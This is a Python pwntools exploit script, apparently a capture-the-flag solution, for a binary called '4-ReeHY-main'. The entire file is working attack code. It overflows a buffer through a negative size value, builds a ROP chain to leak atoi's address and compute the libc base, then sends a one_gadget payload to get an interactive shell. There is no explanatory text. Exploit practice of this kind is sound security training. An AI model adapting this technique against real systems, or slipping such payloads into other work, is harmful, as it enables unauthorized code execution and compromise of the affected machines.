from pwn import *

context.log_level = "debug"
def welcome():
    p.recvuntil("$ ")
    p.sendline("tanghf")
 
def add(size,id,content):
    p.recvuntil("$ ")
    p.sendline("1")
    p.recvuntil("size\n")
    p.sendline(str(size))
    p.recvuntil("cun\n")
    p.sendline(str(id))
    p.recvuntil("content\n")
    p.sendline(content)
 
def remove(id):
    p.recvuntil("$ ")
    p.sendline("2")
    p.recvuntil("dele\n")
    p.sendline(str(id))
 
def edit(id,content):
    p.recvuntil("$ ")
    p.sendline("3")
    p.recvuntil("edit\n")
    p.sendline(str(id))
    p.recvuntil("content\n")
    p.send(content)

p = process('4-ReeHY-main')
elf = ELF('4-ReeHY-main')
libc = ELF('libc-2.23.so')
main_addr = 0x400c8c
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']
libc_system = libc.symbols['system']
libc_atoi = libc.symbols['atoi']
pop_rdi=0x0000000000400da3
one_gadget = 0x45216

welcome()
payload = 0x80*'a'+p64(0)+p64(0)+p64(0)+p64(pop_rdi)+p64(atoi_got)+p64(puts_plt)+p64(main_addr)
add(-1,0,payload)

atoi_addr = u64((p.recv(6)).ljust(8,'\x00'))
print hex(atoi_addr)

print p.recv()
p.sendline('123')

libc_base = atoi_addr - libc_atoi


payload1 = 0x80*'a'+p64(0)+p64(0)+p64(0)+p64(libc_base+one_gadget)
add(-1,0,payload1)
p.interactive()
